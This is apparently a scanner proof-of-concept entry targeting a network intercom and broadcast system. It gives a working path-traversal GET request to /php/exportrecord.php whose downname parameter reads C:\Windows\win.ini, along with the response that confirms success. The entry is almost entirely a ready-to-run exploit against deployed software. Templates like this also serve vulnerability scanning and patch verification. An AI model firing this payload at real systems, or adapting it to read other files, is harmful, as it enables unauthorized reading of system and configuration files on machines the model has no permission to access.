{
        'name': '网络对讲广播系统 /exportrecord.php 任意文件读取',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/php/exportrecord.php?downtype=10&downname=C:\\xxdd.txt\\..\\Windows\\win.ini',
            'headers': {
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'zh-CN,zh;q=0.9',
                'If-None-Match': '"600147ef-2015"',
                'If-Modified-Since': 'Fri, 15 Jan 2021 07:44:47 GMT',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False,
        },
        'response': {
            'status_code': 200,
            'text': 'fonts'
        }}]
    }